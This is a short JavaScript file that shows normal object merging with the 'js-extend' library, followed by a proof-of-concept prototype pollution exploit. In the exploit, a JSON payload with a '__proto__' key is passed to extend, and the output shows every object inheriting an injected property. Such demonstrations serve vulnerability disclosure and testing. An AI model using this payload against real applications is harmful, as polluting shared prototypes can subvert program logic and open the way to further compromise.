var extend = require('js-extend').extend
 
var obj1 = { name: 'Jonny' };
var obj2 = { lastName: 'Quest' };
 
extend(obj1, obj2);
// console.log(obj1);

// obj1: { name: 'Jonny', lastName: 'Quest' }


var jsExtend = require("js-extend")
var obj = {}
var malicious_payload = '{"__proto__":{"polluted":"Yes! Its Polluted"}}';
console.log("Before: " + {}.polluted);
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log("After : " + {}.polluted);